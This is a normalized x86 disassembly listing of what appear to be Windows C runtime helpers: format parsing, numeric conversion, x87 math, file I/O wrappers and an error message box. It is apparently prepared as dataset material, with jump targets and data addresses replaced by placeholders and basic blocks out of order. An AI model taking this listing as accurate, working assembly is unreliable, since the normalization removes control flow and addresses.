mov [ ebp - 0x4 ] eax
je r-xdata
mov ebx r--data
push 0xa
push 0x1
push ecx
cmp eax 0x58
je r-xdata
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
cmp eax ecx
jbe r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
jbe r-xdata
mov eax [ ebp - 0x1b ]
cmp [ ebp - 0x4 ] eax
jae r-xdata
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x2c ] 0x0
je r-xdata
movsx edx [ ebx ]
mov eax [ ebp + 0xc ]
call sub_4082d5
inc ebx
dec esi
jne r-xdata
mov esi eax
sub esi [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x1b ]
cmp [ ebp - 0x4 ] eax
jae r-xdata
movzx eax [ ebp - 0x20 ]
mov [ ebp - 0x8 ] eax
sub eax [ ebp - 0x4 ]
mov ebx eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
call sub_4082d5
dec esi
jne r-xdata
movzx esi [ ebp - 0x20 ]
mov eax [ ebp + 0xc ]
mov edx esi
call sub_4082d5
dec ebx
jne r-xdata
jmp r-xdata
sub_4088ef
inc [ ecx + 0x8 ]
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov edx [ ecx ]
movzx eax [ edx ]
test eax eax
je r-xdata
push [ ecx ]
call sub_4093bd
pop ecx
retn
or eax 0xffffffff
retn
inc edx
mov [ ecx ] edx
retn
sub_408912
dec [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0xffffffff
je r-xdata
push [ eax ]
push [ esp + 0x8 ]
call sub_40a491
pop ecx
pop ecx
retn
retn
dec [ eax ]
sub_408933
push ebp
mov ebp esp
sub esp 0x24
fldz
push ebx
push esi
fstp [ ebp - 0x14 ]
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov ecx edi
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_4088ef
cmp eax 0x2b
je r-xdata
xor ecx ecx
cmp eax 0x2d
sete cl
mov [ ebp - 0x8 ] ecx
mov ecx edi
call sub_4088ef
mov esi [ ebp + 0xc ]
dec esi
jmp r-xdata
cmp eax 0x2d
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp + 0xc ]
mov ecx esi
dec esi
test ecx ecx
jne r-xdata
push eax
mov eax edi
call sub_408912
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi ebx
je r-xdata
push eax
mov eax edi
call sub_408912
pop ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2e
jne r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jae r-xdata
cmp eax 0x65
je r-xdata
cmp esi ebx
je r-xdata
add eax 0xffffffd0
inc [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
mov ecx edi
fld [ ebp - 0x14 ]
fmul [ r--data ]
faddp st1
fstp [ ebp - 0x14 ]
call sub_4088ef
dec esi
jne r-xdata
cmp esi ebx
je r-xdata
cmp eax 0x45
jne r-xdata
push eax
mov eax edi
call sub_408912
cmp [ ebp - 0x4 ] 0x0
pop ecx
je r-xdata
fldz
fstp [ ebp - 0x1c ]
fld1
jmp r-xdata
fld [ r--data ]
mov ecx edi
fstp [ ebp - 0x24 ]
call sub_4088ef
dec esi
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
fld [ ebp - 0x14 ]
je r-xdata
mov ecx edi
fstp [ ebp - 0x24 ]
call sub_4088ef
dec esi
jne r-xdata
cmp eax 0x2b
je r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
fchs
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jae r-xdata
fld [ ebp - 0x1c ]
fdiv [ ebp - 0x24 ]
fadd [ ebp - 0x14 ]
fstp [ ebp - 0x14 ]
cmp eax 0x2d
jne r-xdata
cmp eax 0x2d
jne r-xdata
fstp st0
cmp [ ebp + 0x10 ] 0x3
je r-xdata
add eax 0xffffffd0
inc [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fld [ ebp - 0x1c ]
fld [ r--data ]
fmul st1
fxch st2
faddp st1
fstp [ ebp - 0x1c ]
fmul [ ebp - 0x24 ]
mov ecx edi
call sub_4088ef
dec esi
fld [ r--data ]
fstp [ ebp - 0x24 ]
test esi esi
je r-xdata
fstp [ eax ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x8
je r-xdata
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jae r-xdata
xor eax eax
inc eax
fstp [ eax ]
jmp r-xdata
test ebx ebx
je r-xdata
imul ebx ebx 0xa
mov ecx edi
lea ebx [ ebx + eax - 0x30 ]
call sub_4088ef
dec esi
jne r-xdata
fld [ ebp - 0x24 ]
sar ebx 0x1
fld st0
fmulp st1
jne r-xdata
fld [ ebp - 0x14 ]
fmul st1
fstp [ ebp - 0x14 ]
test bl 0x1
je r-xdata
fstp st0
sub_408af0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov ecx esi
xor ebx ebx
mov [ ebp - 0x4 ] edi
call sub_4088ef
cmp eax 0x2d
je r-xdata
xor ecx ecx
cmp eax 0x2d
sete cl
mov [ ebp - 0x4 ] ecx
mov ecx esi
call sub_4088ef
dec [ ebp + 0x10 ]
cmp eax 0x2b
jne r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
push eax
mov eax esi
call sub_408912
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
push eax
mov eax esi
call sub_408912
test edi edi
pop ecx
jne r-xdata
dec [ ebp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
movzx ecx al
cmp ecx 0x61
jb r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
neg ebx
cmp ecx 0x41
jb r-xdata
sub ecx 0x20
xor eax eax
inc eax
mov ecx [ ebp + 0x14 ]
dec ecx
je r-xdata
add ecx 0xffffffd0
cmp ecx 0x9
ja r-xdata
sub ecx 0x37
jmp r-xdata
mov [ eax ] bx
dec ecx
je r-xdata
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov [ eax ] bl
jmp r-xdata
dec ecx
dec ecx
mov [ eax ] ebx
jne r-xdata
imul ebx [ ebp + 0xc ]
add ebx ecx
mov ecx esi
inc edi
call sub_4088ef
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
and [ eax + 0x4 ] 0x0
jmp r-xdata
sub_408bc4
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push edi
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
movzx eax [ esi ]
push eax
call sub_4097da
test eax eax
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ esi ] 0x25
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_4097da
test eax eax
pop ecx
jne r-xdata
mov ecx [ ebp + 0xc ]
call sub_4088ef
mov ebx eax
movzx eax [ esi ]
cmp eax ebx
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x25
je r-xdata
mov ecx [ ebp + 0xc ]
call sub_4088ef
mov ebx eax
push ebx
call sub_4097da
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp + 0xc ]
push ebx
call sub_408912
mov eax [ ebp + 0x8 ]
test eax eax
pop ecx
jne r-xdata
inc esi
xor edi edi
mov esi eax
xor ebx ebx
cmp [ esi ] 0x2a
push 0x4
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] edi
pop edx
jne r-xdata
mov eax [ ebp + 0xc ]
push ebx
call sub_408912
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx 0xffffffff
jmp r-xdata
add [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov edi [ eax - 0x4 ]
mov [ ebp - 0x8 ] edi
inc esi
jmp r-xdata
jne r-xdata
or ebx 0xffffffff
mov [ ebp - 0xc ] ebx
imul ebx ebx 0xa
inc esi
lea ebx [ ebx + eax - 0x30 ]
movzx eax [ esi ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jb r-xdata
movzx eax [ esi ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jae r-xdata
jmp r-xdata
cmp [ esi ] 0x36
jne r-xdata
push 0x3
pop ecx
sub eax ecx
je r-xdata
test ebx ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
or eax 0xffffffff
jmp r-xdata
dec esi
cmp [ esi + 0x1 ] 0x34
jne r-xdata
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
sub eax 0x1c
je r-xdata
movzx eax [ esi ]
inc esi
sub eax 0x49
je r-xdata
cmp [ esi ] 0x6e
je r-xdata
cmp al 0x63
je r-xdata
inc esi
inc esi
mov al [ esi ]
cmp al 0x5b
je r-xdata
cmp [ esi ] 0x68
mov [ ebp - 0x4 ] 0x1
jne r-xdata
dec eax
dec eax
je r-xdata
mov ebx [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
call sub_4088ef
mov ebx eax
mov eax [ ebp + 0xc ]
push ebx
call sub_408912
cmp ebx 0xffffffff
pop ecx
je r-xdata
cmp al 0x6e
je r-xdata
inc esi
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
dec eax
dec eax
je r-xdata
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
movzx eax [ esi ]
inc esi
cmp eax 0x67
jg r-xdata
mov ecx [ ebp + 0xc ]
call sub_4088ef
mov ebx eax
push ebx
call sub_4097da
test eax eax
pop ecx
jne r-xdata
cmp [ esi ] 0x6c
mov [ ebp - 0x4 ] ecx
jne r-xdata
sub eax 0x8
je r-xdata
push edi
push [ ebp - 0x4 ]
push ebx
push 0xa
sub eax 0x5
je r-xdata
push edi
push [ ebp - 0x4 ]
push ebx
push [ ebp + 0xc ]
call sub_408933
add esp 0x10
jmp r-xdata
cmp eax 0x5b
jg r-xdata
mov eax [ ebp + 0xc ]
push ebx
call sub_408912
cmp [ ebp + 0x8 ] 0x0
pop ecx
jne r-xdata
inc esi
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
jmp r-xdata
push 0x6
pop ecx
sub eax ecx
jne r-xdata
test eax eax
je r-xdata
test edi edi
je r-xdata
dec eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
sub eax 0x61
je r-xdata
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] ecx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
dec eax
je r-xdata
push edi
push [ ebp - 0x4 ]
push ebx
push 0x8
jmp r-xdata
dec eax
je r-xdata
dec eax
dec eax
je r-xdata
xor edi edi
cmp [ esi ] 0x5e
mov ebx esi
mov [ ebp - 0xc ] edi
jne r-xdata
cmp eax 0x41
je r-xdata
inc [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x8 ]
mov [ edi ] ax
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
call sub_408af0
add esp 0x14
push edi
push 0x0
push 0x8
jmp r-xdata
sub eax 0x3
je r-xdata
cmp ebx 0xffffffff
jne r-xdata
dec eax
jne r-xdata
cmp [ esi ] 0x5d
jne r-xdata
lea ebx [ esi + 0x1 ]
inc edi
mov esi ebx
cmp eax 0x44
jle r-xdata
mov eax [ ebp + 0xc ]
mov al [ eax + 0x8 ]
mov [ edi ] al
jmp r-xdata
dec eax
dec eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
mov [ edi ] eax
jne r-xdata
push 0x10
jmp r-xdata
test ebx ebx
je r-xdata
dec eax
dec eax
je r-xdata
test ebx ebx
jne r-xdata
xor ebx ebx
inc ebx
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
jmp r-xdata
cmp eax 0x47
jle r-xdata
and [ edi + 0x4 ] 0x0
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp + 0xc ]
dec [ ebp - 0xc ]
call sub_4088ef
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub eax 0x3
mov ecx [ ebp + 0xc ]
dec ebx
call sub_4088ef
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp al 0x5d
je r-xdata
jmp r-xdata
inc esi
cmp eax 0x58
jmp r-xdata
mov [ edi ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
call sub_408912
pop ecx
push ebx
call sub_4097da
test eax eax
pop ecx
jne r-xdata
push edi
push [ ebp - 0x4 ]
push ebx
mov eax [ ebp + 0xc ]
push 0xffffffff
call sub_408912
pop ecx
test edi edi
je r-xdata
mov ecx [ ebp + 0xc ]
call sub_4088ef
cmp eax 0xffffffff
jne r-xdata
jne r-xdata
test edi edi
je r-xdata
mov [ edi ] al
inc edi
cmp ebx esi
mov ecx ebx
jae r-xdata
push eax
mov eax [ ebp + 0xc ]
call sub_408912
cmp [ esi ] 0x5d
pop ecx
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ edi ] bl
inc edi
test edi edi
je r-xdata
movzx edx [ ecx ]
cmp eax edx
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc esi
jmp r-xdata
cmp ecx esi
je r-xdata
cmp ecx esi
jne r-xdata
inc ecx
cmp ecx esi
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
mov edi eax
jmp r-xdata
inc [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
sub_409013
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0x14 ]
push esi
add ecx 0x76c
push ecx
push [ eax ]
mov ecx [ eax + 0x10 ]
push [ eax + 0x4 ]
lea ecx [ ecx * 4 + r--data ]
push [ eax + 0x8 ]
mov esi rw-data
push [ eax + 0xc ]
mov eax [ eax + 0x18 ]
push ecx
lea eax [ eax * 4 + r--data ]
push eax
push r--data
push esi
call [ wsprintfA@IAT ]
add esp 0x24
mov eax esi
pop esi
retn
sub_409081
push ebp
mov ebp esp
sub esp 0x400
push [ ebp + 0x10 ]
lea eax [ ebp - 0x400 ]
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x18
push 0x10
push r--data
lea eax [ ebp - 0x400 ]
push eax
push 0x0
call [ MessageBoxA@IAT ]
push 0xffffffff
call [ ExitProcess@IAT ]
sub_409158
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0x10 ]
dec edi
imul edi ebx
add edi eax
test ebx ebx
mov [ ebp + 0xc ] eax
jne r-xdata
cmp eax edi
push esi
ja r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0xc ]
xor edx edx
div ebx
mov esi eax
shr esi 0x1
imul esi ebx
add esi [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call [ ebp + 0x18 ]
test eax eax
pop ecx
pop ecx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
jge r-xdata
add esi ebx
mov [ ebp + 0xc ] esi
jmp r-xdata
mov eax esi
jmp r-xdata
sub esi ebx
mov edi esi
cmp [ ebp + 0xc ] edi
jbe r-xdata
pop esi
sub_4091de
push eax
fwait
fnstcw [ esp ]
fwait
pop eax
push eax
and ah 0xf3
or ah 0x8
push eax
fldcw [ esp ]
pop eax
frndint
fldcw [ esp ]
pop eax
retn
sub_409224
fld [ esp + 0x4 ]
jmp r-xdata
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
faddp st1
fld [ r--data ]
fdivp st1
retn
sub_40922a
fld [ esp + 0x4 ]
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
fld st0
fld1
fdivrp st1
faddp st1
fld [ r--data ]
fdivp st1
retn
sub_409255
push esi
push 0x1000
call sub_409875
mov esi eax
test esi esi
pop ecx
je r-xdata
mov eax esi
pop esi
retn
lea eax [ esp + 0xc ]
push eax
push [ esp + 0xc ]
push esi
call sub_40a55d
add esp 0xc
sub_40927d
push esi
push edi
push 0x1000
call sub_409875
mov esi [ esp + 0x1c ]
test esi esi
mov edi eax
pop ecx
mov eax esi
jne r-xdata
push eax
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push r--data
push edi
call sub_409dc9
add esp 0x18
test esi esi
je r-xdata
mov eax r--data
push edi
call [ OutputDebugStringA@IAT ]
push edi
call sub_40957e
pop ecx
pop edi
pop esi
retn
push esi
call sub_40957e
pop ecx
sub_4092ec
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
leave
retn
sub_409340
fld [ esp + 0x4 ]
jmp r-xdata
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_409346
fld [ esp + 0x4 ]
fldl2e
fmulp st1
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_409393
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax ]
push eax
call sub_40957e
cmp esi 0xffffffff
pop ecx
jne r-xdata
push esi
call [ CloseHandle@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
pop esi
retn
xor eax eax
pop esi
retn
sub_4093bd
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0xffffffff
je r-xdata
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0xb ]
push ecx
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ eax + 0x4 ]
or [ eax + 0x4 ] 0xffffffff
movzx eax cl
leave
retn
or eax 0xffffffff
leave
retn
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
movzx eax [ ebp + 0xb ]
leave
retn
sub_4093ff
push esi
mov esi [ esp + 0xc ]
push 0x1
lea eax [ esi + 0x4 ]
and [ eax ] 0x0
push eax
mov eax [ esp + 0x10 ]
push 0x0
push [ eax ]
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
pop esi
jne r-xdata
xor eax eax
retn
call [ GetLastError@IAT ]
neg eax
sbb eax eax
neg eax
retn
sub_409433
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jg r-xdata
push [ ebp + 0x10 ]
call sub_4093bd
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] 0x0
xor eax eax
jmp r-xdata
mov [ esi ] al
inc esi
cmp eax 0xa
je r-xdata
pop esi
pop ebp
retn
dec [ ebp + 0xc ]
sub_409472
push eax
fwait
fnstcw [ esp ]
fwait
pop eax
push eax
and ah 0xf3
or ah 0x4
push eax
fldcw [ esp ]
pop eax
frndint
fldcw [ esp ]
pop eax
retn
sub_40949f
push ebp
mov ebp esp
mov eax 0x19000
call sub_408124
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x19000 ]
push eax
mov [ ebp - 0x19000 ] 0x0
call [ wvsprintfA@IAT ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x19000 ]
push eax
call sub_409510
pop ecx
pop ecx
leave
retn
sub_4094da
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0xc ]
push [ eax ]
mov [ ebp + 0xb ] bl
call [ WriteFile@IAT ]
test eax eax
je r-xdata
or eax 0xffffffff
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov eax ebx
jmp r-xdata
pop ebx
leave
retn
sub_409510
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor ecx ecx
xor esi esi
cmp [ eax ] cl
je r-xdata
push ecx
lea ecx [ ebp + 0x8 ]
push ecx
push esi
push eax
mov eax [ ebp + 0xc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
inc esi
cmp [ esi + eax ] cl
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax esi
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
or eax 0xffffffff
sub_40954d
push ebp
mov ebp esp
push 0x0
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
push [ eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x10 ]
xor edx edx
div [ ebp + 0xc ]
pop ebp
retn
sub_409591
push esi
mov esi [ esp + 0x10 ]
push edi
xor edi edi
cmp esi edi
je r-xdata
push 0x8
call sub_409875
mov esi eax
cmp esi edi
pop ecx
jne r-xdata
mov eax [ esi ]
cmp eax 0xffffffff
je r-xdata
or [ esi ] 0xffffffff
or [ esi + 0x4 ] 0xffffffff
push ebx
mov ebx [ esp + 0x14 ]
mov al [ ebx ]
cmp al 0x61
mov edx 0xc0000000
je r-xdata
xor eax eax
jmp r-xdata
push eax
call [ CloseHandle@IAT ]
mov eax edx
push 0x4
cmp al 0x72
je r-xdata
pop edi
pop esi
retn
push edi
push edi
push ecx
push edi
push 0x3
push eax
push [ esp + 0x28 ]
call [ CreateFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
mov eax edx
mov eax 0x80000000
push 0x3
jmp r-xdata
cmp al 0x77
jne r-xdata
cmp [ ebx ] 0x61
jne r-xdata
push esi
call sub_40957e
pop ecx
xor eax eax
jmp r-xdata
cmp [ ebx + 0x1 ] 0x2b
pop ecx
jne r-xdata
mov eax 0x40000000
push 0x2
jmp r-xdata
mov [ esi ] edi
mov eax esi
push 0x2
push 0x0
push 0x0
push edi
call [ SetFilePointer@IAT ]
pop ebx
sub_409638
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] 0x1
call sub_408bc4
add esp 0xc
leave
retn
sub_409681
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
push 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push ecx
push [ eax ]
mov [ ebp - 0x8 ] ecx
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
xor eax eax
leave
retn
call [ GetLastError@IAT ]
neg eax
sbb eax eax
neg eax
leave
retn
sub_4096d3
push ebp
mov ebp esp
push 0x0
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
imul eax [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
mov eax [ ebp + 0x14 ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x10 ]
xor edx edx
div [ ebp + 0xc ]
pop ebp
retn
sub_409704
push esi
push edi
mov esi 0x400
push esi
mov edi rw-data
push edi
push [ esp + 0x14 ]
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
xor eax eax
cmp eax esi
ja r-xdata
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_40972d
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi rw-data
jmp r-xdata
push edi
call sub_4093bd
cmp eax 0xffffffff
pop ecx
jne r-xdata
cmp eax 0xa
je r-xdata
xor eax eax
mov eax [ esp + 0xc ]
mov [ esi ] 0x0
jmp r-xdata
mov [ esi ] al
inc esi
pop edi
pop esi
retn
sub_40975c
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x1a
jb r-xdata
xor eax eax
inc eax
retn
lea ecx [ eax - 0x41 ]
cmp ecx 0x1a
jb r-xdata
add eax 0xffffffd0
cmp eax 0xa
jb r-xdata
xor eax eax
retn
sub_4097af
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x21 ]
cmp ecx 0xf
jb r-xdata
xor eax eax
inc eax
retn
lea ecx [ eax - 0x3a ]
cmp ecx 0x7
jb r-xdata
lea ecx [ eax - 0x5b ]
cmp ecx 0x6
jb r-xdata
add eax 0xffffff85
cmp eax 0x4
jb r-xdata
xor eax eax
retn
sub_4097f2
mov eax [ esp + 0x4 ]
lea ecx [ eax - 0x30 ]
cmp ecx 0xa
jb r-xdata
xor eax eax
inc eax
retn
lea ecx [ eax - 0x61 ]
cmp ecx 0x6
jb r-xdata
add eax 0xffffffbf
cmp eax 0x6
jb r-xdata
xor eax eax
retn
sub_409897
xor eax eax
cmp [ esp + 0xc ] eax
jbe r-xdata
xor eax eax
retn
mov ecx [ esp + 0x4 ]
add eax ecx
retn
inc eax
cmp eax [ esp + 0xc ]
jb r-xdata
mov dl [ eax + ecx ]
cmp dl [ esp + 0x8 ]
je r-xdata
sub_4098b9
push ebx
xor ecx ecx
cmp [ esp + 0x10 ] ecx
push esi
push edi
jbe r-xdata
xor eax eax
mov edx [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
mov edi edx
mov eax esi
sub edi esi
movsx eax [ ecx + esi ]
movsx ecx [ ecx + edx ]
sub eax ecx
jmp r-xdata
inc ecx
inc eax
cmp ecx [ esp + 0x18 ]
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov bl [ eax ]
cmp bl [ edi + eax ]
jne r-xdata
sub_4098f3
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jbe r-xdata
mov eax [ ebp + 0x8 ]
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
sub eax ecx
mov dl [ eax + ecx ]
mov [ ecx ] dl
inc ecx
dec esi
jne r-xdata
sub_409915
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp edi esi
ja r-xdata
mov edx [ esp + 0x14 ]
test edx edx
je r-xdata
push [ esp + 0x14 ]
push esi
push edi
call sub_4098f3
add esp 0xc
jmp r-xdata
mov eax edi
lea ecx [ edi + edx - 0x1 ]
sub esi edi
pop edi
pop esi
retn
mov al [ esi + ecx ]
dec edx
mov [ ecx ] al
dec ecx
test edx edx
jne r-xdata
sub_409951
mov ecx [ esp + 0xc ]
test ecx ecx
jbe r-xdata
mov eax [ esp + 0x4 ]
retn
mov al [ esp + 0x8 ]
push ebx
mov bl al
mov bh bl
mov edx ecx
push edi
mov edi [ esp + 0xc ]
shr ecx 0x2
mov eax ebx
shl eax 0x10
mov ax bx
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop ebx
sub_409984
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
inc esi
push esi
push 0x0
push eax
call [ HeapAlloc@IAT ]
pop esi
retn
call [ GetProcessHeap@IAT ]
mov [ rw-data ] eax
sub_4099b0
fld [ esp + 0xc ]
fld [ esp + 0x4 ]
fyl2x
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_4099d0
fld [ esp + 0x8 ]
fld [ esp + 0x4 ]
fyl2x
fld st0
frndint
fsub st1
fxch st1
f2xm1
fld1
faddp st1
fscale
fstp st1
retn
sub_4099ed
push ebp
mov ebp esp
sub esp 0x400
lea eax [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x400 ]
push eax
mov [ ebp - 0x400 ] 0x0
call [ wvsprintfA@IAT ]
lea eax [ ebp - 0x400 ]
push rw-data
push eax
call sub_409510
pop ecx
pop ecx
leave
retn
sub_409a26
push esi
push edi
mov esi rw-data
push esi
push [ esp + 0x10 ]
call sub_409510
mov edi eax
cmp edi 0xffffffff
pop ecx
pop ecx
jne r-xdata
push esi
push r--data
call sub_409510
cmp eax 0xffffffff
pop ecx
pop ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ edi + 0x2 ]
pop edi
pop esi
retn
sub_409a5d
cmp eax ecx
push edi
mov edi edx
je r-xdata
pop edi
retn
cmp edi 0x3
push ebx
jbe r-xdata
test edi edi
jne r-xdata
push esi
lea esi [ edi - 0x4 ]
shr esi 0x2
inc esi
